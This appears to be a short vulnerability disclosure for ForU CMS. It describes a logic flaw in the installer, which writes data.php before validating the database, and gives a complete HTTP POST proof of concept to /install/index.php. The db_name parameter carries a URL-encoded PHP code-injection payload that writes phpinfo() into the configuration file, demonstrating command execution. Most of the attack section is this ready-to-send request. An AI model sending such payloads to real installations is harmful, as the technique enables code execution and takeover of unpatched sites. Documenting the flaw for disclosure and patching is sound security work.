ForU CMS install.php command execution vulnerability

downlaod:https://gitee.com/sw1981/ForU-CMS
version:dev Official version

There is a logical defect in writing files to data.php before performing database judgment
![微信图片_20230912224714](https://github.com/Fovker8/cve/assets/97042667/bb19d2e8-ab8b-4c95-b5ab-ec877cc741c0)

poc
```
POST /install/index.php HTTP/1.1
Host: www.forucms.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Origin: http://www.forucms.com
Connection: close
Referer: http://www.forucms.com/install/index.php
Cookie: PHPSESSID=8qv3um38h8smqsghf9hibmu7c7; cms[url_back]=http%3A%2F%2Fwww.forucms.com%2Findex.php
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 1.1.1.1
X-Originating-IP: 1.1.1.1
X-Remote-IP: 1.1.1.1
X-Remote-Addr: 1.1.1.1

db_host=127.0.0.1&db_name=%27%29%3Bphpinfo%28%29%3B%2F%2F&db_username=1&db_password=1&admin_id=admin&admin_password=admin&db_prefix=cms_&save=%E5%AE%89%E8%A3%85
```
![2](https://github.com/Fovker8/cve/assets/97042667/2ca16034-6a93-4252-aeb6-641ae11b1ab9)

![3](https://github.com/Fovker8/cve/assets/97042667/5b449ac7-480f-460d-80c2-f3544c41e986)
